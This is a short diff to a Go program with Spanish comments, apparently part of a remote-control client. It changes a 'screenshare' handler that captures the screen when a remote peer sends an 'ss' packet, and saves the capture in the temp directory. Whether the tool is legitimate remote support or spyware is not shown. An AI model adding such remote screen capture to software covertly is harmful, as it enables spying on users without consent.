@@ -81,7 +81,7 @@ func Enviar_img(conexion net.Conn, archivo string) error {
 
 // Ss : screenshare -> maneja la logica cuando el cliente envia un paquete ss
 func Ss(conexion net.Conn) error {
-	nombre := "captura.png"
+	nombre := os.TempDir() + "\\" + "captura.png" // ruta temporal donde va a parar la imagen
 	bordes := screenshot.GetDisplayBounds(0)
 	img, erro := screenshot.CaptureRect(bordes)
 	if erro != nil {
